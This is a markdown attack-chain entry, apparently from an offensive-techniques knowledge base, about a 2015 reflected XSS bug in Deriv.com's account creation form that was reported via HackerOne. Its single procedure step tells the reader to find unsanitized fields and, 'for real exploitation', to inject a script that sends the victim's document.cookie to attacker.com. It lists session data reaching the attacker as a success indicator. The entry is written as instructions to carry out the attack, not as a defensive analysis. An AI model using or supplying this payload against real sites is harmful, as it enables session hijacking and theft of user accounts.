---
id: ac-xss-deriv-account-creation-2015
tags:
  - xss
  - web
  - injection
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-XSS-in-Account-Creation-Form]]'
step_count: 1
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.132Z'
description: >-
  A cross-site scripting vulnerability in the new account section of Deriv.com
  (formerly binary.com) allows injection of malicious scripts into user browsers
  during account creation, potentially leading to session hijacking or data
  theft.
skill_level: beginner
impact_level: medium
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS in Deriv.com Account Creation Leading to Script Injection and Session Hijacking

Multi-stage attack chain demonstrating exploitation of a reflected XSS vulnerability in the account creation process of Deriv.com, reported in 2015 via HackerOne.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Input] --> B[Inject Malicious Script]
    B --> C[Execute in Victim Browser]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools (e.g., Chrome DevTools)

### Target Environment

- Web platform
- Access to the account creation page (publicly accessible)
- No authentication required for initial testing

### Initial Access Requirements

- Internet access
- Victim interaction (e.g., tricking user into visiting crafted link)
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Exploit XSS in Account Creation
procedure: [[procedures/Exploit-XSS-in-Account-Creation-Form]]

**Objective**: Inject a malicious JavaScript payload into the account creation form to execute arbitrary scripts in the victim's browser, enabling session hijacking or data theft.

**Instructions**: Navigate to the vulnerable account creation page and identify unsanitized input fields (e.g., name or email). Craft a payload such as `<script>alert('XSS')</script>` and submit it. For real exploitation, use a payload to steal cookies, like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. Test in a browser to confirm execution.

**Expected Output**: Alert box or redirection to attacker's site with stolen data.

**Success Indicators**:
- Script executes in browser (e.g., alert pops up)
- Victim's session data is exfiltrated to attacker's controlled endpoint

## Attack Chain Summary

### Key Achievements

1. Successful injection of malicious script via account creation form
2. Execution of JavaScript in victim's browser context
3. Potential for session hijacking or sensitive data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
